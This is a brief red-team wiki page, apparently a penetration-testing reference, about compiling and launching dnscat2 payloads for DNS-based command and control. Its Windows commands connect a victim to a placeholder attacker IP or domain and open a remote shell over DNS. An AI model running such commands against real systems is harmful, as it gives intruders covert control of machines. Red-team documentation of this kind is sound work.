---
author(s):
  - Userware
tags:
  - red-team-infrastructure
  - command-and-control
  - interactive-shell
  - dnscat2
---
# Payloads

TODO: Provide a usage example with dnscat2

## Compile Payload

### Linux

```
$ cd dnscat2/client/ && make
```

### Windows

```
C:\> dnscat2-win32.exe --host <attacker_IP>
```

```
PS C:\> Start-Dnscat2 -Domain <domain>.<tld> -DNSServer <attacker_IP>
```

---
## References

- [lukebaggett: DNSCat2 PowerShell Payload](https://github.com/lukebaggett/dnscat2-powershell)

- [avitex: Rust DNSCat](https://github.com/avitex/rust-dnscat)

- [Pentestlab Blog: Command and Control - DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)